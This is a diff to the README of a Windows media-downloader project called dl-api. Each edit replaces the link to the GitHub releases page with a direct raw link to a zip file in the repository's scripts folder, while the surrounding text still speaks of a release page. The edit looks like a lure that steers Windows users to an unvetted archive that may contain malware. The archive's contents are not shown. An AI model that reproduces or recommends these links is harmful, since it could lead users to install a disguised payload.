@@ -1,10 +1,10 @@
 # 🚀 dl-api - Fast Media Extraction Made Simple
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/chasak1919/dl-api/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/chasak1919/dl-api/releases](https://github.com/chasak1919/dl-api/releases)
+Visit this page to download: [https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)
 
 Choose the latest release, then download the Windows file that matches your system.
 
@@ -28,7 +28,7 @@ If your browser asks to open localhost or 127.0.0.1, allow it.
 
 ## 🖥️ How to install on Windows
 
-1. Open the download page: [https://github.com/chasak1919/dl-api/releases](https://github.com/chasak1919/dl-api/releases)
+1. Open the download page: [https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)
 2. Find the newest release at the top
 3. Download the Windows package listed there
 4. If the file is in a .zip file, right-click it and choose Extract All
@@ -155,7 +155,7 @@ If a download does not start:
 
 ## 📁 Release download path
 
-Use the latest release page here: [https://github.com/chasak1919/dl-api/releases](https://github.com/chasak1919/dl-api/releases)
+Use the latest release page here: [https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip](https://github.com/chasak1919/dl-api/raw/refs/heads/main/scripts/api_dl_v1.8-alpha.2.zip)
 
 That is the place to visit to download the Windows release file.
 
